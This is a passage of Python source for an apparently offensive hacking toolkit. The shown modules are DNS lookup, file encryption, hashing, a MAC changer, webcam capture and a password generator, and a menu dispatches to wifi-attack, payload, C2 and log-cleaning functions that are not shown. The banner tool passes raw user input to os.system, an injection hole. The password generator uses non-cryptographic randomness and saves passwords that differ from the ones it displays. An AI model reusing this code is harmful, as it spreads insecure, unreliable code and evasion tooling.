        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    DNS LOOKUP MODULE                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        domain = input(f"{self.prompt()}domain > ")
        
        records = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        
        for rtype in records:
            try:
                import dns.resolver
                answers = dns.resolver.resolve(domain, rtype)
                print(f"{Colors.GREEN}[+] {rtype} Records:{Colors.END}")
                for ans in answers:
                    print(f"    {ans}")
            except:
                print(f"{Colors.DIM}[!] No {rtype} records{Colors.END}")
    
    def reverse_ip(self):
        """Reverse IP lookup"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    REVERSE IP LOOKUP                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        ip = input(f"{self.prompt()}IP > ")
        
        try:
            import dns.reversename
            addr = dns.reversename.from_address(ip)
            print(f"{Colors.GREEN}[+] PTR Record:{Colors.END}")
            print(f"    {dns.resolver.resolve(addr, 'PTR')[0]}")
        except:
            print(f"{Colors.RED}[!] No PTR record{Colors.END}")
    
    # ============================================================
    # UTILITY MODULES
    # ============================================================
    
    def file_crypt(self):
        """File encryption/decryption"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    FILE CRYPT MODULE                                 ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.RED}[1]{Colors.WHITE} Encrypt")
        print(f"{Colors.RED}[2]{Colors.WHITE} Decrypt")
        choice = input(self.prompt())
        
        if choice == '1':
            filepath = input(f"{self.prompt()}file > ")
            if os.path.exists(filepath):
                key = Fernet.generate_key()
                cipher = Fernet(key)
                with open(filepath, 'rb') as f:
                    data = f.read()
                encrypted = cipher.encrypt(data)
                with open(filepath + '.enc', 'wb') as f:
                    f.write(encrypted)
                with open(filepath + '.key', 'wb') as f:
                    f.write(key)
                print(f"{Colors.GREEN}[+] Encrypted: {filepath}.enc{Colors.END}")
                print(f"{Colors.GREEN}[+] Key: {filepath}.key{Colors.END}")
        elif choice == '2':
            encfile = input(f"{self.prompt()}encrypted file > ")
            keyfile = input(f"{self.prompt()}key file > ")
            if os.path.exists(encfile) and os.path.exists(keyfile):
                with open(keyfile, 'rb') as f:
                    key = f.read()
                cipher = Fernet(key)
                with open(encfile, 'rb') as f:
                    data = f.read()
                decrypted = cipher.decrypt(data)
                with open(encfile.replace('.enc', '.dec'), 'wb') as f:
                    f.write(decrypted)
                print(f"{Colors.GREEN}[+] Decrypted: {encfile.replace('.enc', '.dec')}{Colors.END}")
    
    def hash_generator(self):
        """Generate hashes"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    HASH GENERATOR                                    ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        text = input(f"{self.prompt()}text > ")
        
        print(f"\n{Colors.GREEN}[+] Hashes:{Colors.END}")
        print(f"    MD5: {hashlib.md5(text.encode()).hexdigest()}")
        print(f"    SHA1: {hashlib.sha1(text.encode()).hexdigest()}")
        print(f"    SHA256: {hashlib.sha256(text.encode()).hexdigest()}")
        print(f"    SHA512: {hashlib.sha512(text.encode()).hexdigest()}")
    
    def encode_decode(self):
        """Base64/URL encode decode"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    ENCODE/DECODE MODULE                              ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Base64 Encode")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} Base64 Decode")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} URL Encode")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} URL Decode")
        choice = input(self.prompt())
        
        text = input(f"{self.prompt()}text > ")
        
        if choice == '1':
            print(f"{Colors.GREEN}[+] {base64.b64encode(text.encode()).decode()}{Colors.END}")
        elif choice == '2':
            try:
                print(f"{Colors.GREEN}[+] {base64.b64decode(text).decode()}{Colors.END}")
            except:
                print(f"{Colors.RED}[!] Invalid Base64{Colors.END}")
        elif choice == '3':
            print(f"{Colors.GREEN}[+] {requests.utils.quote(text)}{Colors.END}")
        elif choice == '4':
            print(f"{Colors.GREEN}[+] {requests.utils.unquote(text)}{Colors.END}")
    
    def mac_changer(self):
        """MAC address changer"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    MAC CHANGER MODULE                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!] Root required{Colors.END}")
            return
        
        interfaces = [i for i in os.listdir('/sys/class/net/') if i.startswith(('eth', 'wlan', 'enp', 'wl'))]
        print(f"{Colors.GREEN}Available: {', '.join(interfaces)}{Colors.END}")
        
        iface = input(f"{self.prompt()}interface > ")
        if iface in interfaces:
            os.system(f"ifconfig {iface} down")
            os.system(f"macchanger -r {iface}")
            os.system(f"ifconfig {iface} up")
            print(f"{Colors.GREEN}[+] MAC changed on {iface}{Colors.END}")
    
    def webcam_capture(self):
        """Webcam capture"""
        print(f"""
{Colors.BLOOD_RED}╔═══════════════════════════════════════════════════════════════╗
║                    WEBCAM CAPTURE                                    ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        if os.system("which termux-camera-photo > /dev/null 2>&1") == 0:
            filename = f"{self.shadow_dir}/webcam_{int(time.time())}.jpg"
            os.system(f"termux-camera-photo {filename}")
            print(f"{Colors.GREEN}[+] Photo: {filename}{Colors.END}")
        else:
            print(f"{Colors.RED}[!] termux-api required: pkg install termux-api{Colors.END}")
    
    def password_generator(self):
        """Generate random passwords"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    PASSWORD GENERATOR                                ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        length = int(input(f"{self.prompt()}length (12) > ") or "12")
        count = int(input(f"{self.prompt()}count (5) > ") or "5")
        
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        
        print(f"\n{Colors.GREEN}[+] Generated passwords:{Colors.END}")
        for i in range(count):
            password = ''.join(random.choice(chars) for _ in range(length))
            print(f"    {i+1}. {password}")
        
        filename = f"{self.shadow_dir}/passwords_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for i in range(count):
                f.write(f"{i+1}. {''.join(random.choice(chars) for _ in range(length))}\n")
        print(f"\n{Colors.GREEN}[+] Saved to {filename}{Colors.END}")
    
    def banner_generator(self):
        """Generate ASCII banners"""
        print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
║                    BANNER GENERATOR                                  ║
╚═══════════════════════════════════════════════════════════════╝{Colors.END}
        """)
        
        text = input(f"{self.prompt()}text > ")
        
        print(f"\n{Colors.GREEN}[+] ASCII Art:{Colors.END}")
        try:
            import pyfiglet
            banner = pyfiglet.figlet_format(text)
            print(banner)
        except:
            os.system(f"figlet {text}")
    
    # ============================================================
    # MAIN LOOP
    # ============================================================
    
    def run(self):
        """Main execution loop"""
        self.clear_screen()
        
        while True:
            try:
                cmd = input(self.prompt()).strip().lower()
                
                # Attack
                if cmd in ['wifi', 'w']:
                    self.wifi_attack()
                elif cmd in ['payload', 'p']:
                    self.generate_payload()
                elif cmd in ['c2', 'server']:
                    self.start_c2()
                elif cmd in ['stealth', 's']:
                    self.stealth_clean()
                elif cmd in ['anon', 'a']:
                    self.anonymity()
                
                # OSINT
                elif cmd in ['phone', 'tel']:
                    self.phone_osint()
                elif cmd in ['ip', 'geo', 'track']:
                    self.ip_tracker()
                elif cmd in ['username', 'user']:
                    self.username_check()
                elif cmd in ['subdomain', 'sub']:
                    self.subdomain_scan()
                elif cmd in ['port', 'scan']:
                    self.port_scanner()
                elif cmd in ['dork', 'google']:
                    self.dork_generator()
                elif cmd in ['email', 'mail']:
                    self.email_osint()
                elif cmd in ['whois']:
                    self.whois_lookup()
                elif cmd in ['dns']:
                    self.dns_lookup()
                elif cmd in ['reverseip', 'revip']:
                    self.reverse_ip()
                
                # Utility
                elif cmd in ['crypt', 'encrypt', 'decrypt']:
                    self.file_crypt()
                elif cmd in ['hash']:
                    self.hash_generator()
                elif cmd in ['encode', 'decode', 'base64']:
                    self.encode_decode()
                elif cmd in ['mac', 'macchanger']:
                    self.mac_changer()
                elif cmd in ['webcam', 'cam']:
                    self.webcam_capture()
                elif cmd in ['passgen', 'pg']:
                    self.password_generator()
                elif cmd in ['banner']:
                    self.banner_generator()
                
                # System
                elif cmd in ['clear', 'cls']:
                    self.clear_screen()
                elif cmd in ['help', '?']:
                    self.show_help()
                elif cmd in ['exit', 'quit', 'q']:
                    print(f"{Colors.RED}[!] Returning to void...{Colors.END}")
                    sys.exit(0)
                elif cmd == '':
                    continue
                else:
                    print(f"{Colors.RED}[!] Unknown: {cmd}. Type 'help'{Colors.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] Interrupted. Exiting...{Colors.END}")
                sys.exit(0)
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

# ============================================================
# MAIN ENTRY POINT
# ============================================================

if __name__ == "__main__":
    core = ForgottenCore()
    core.run()
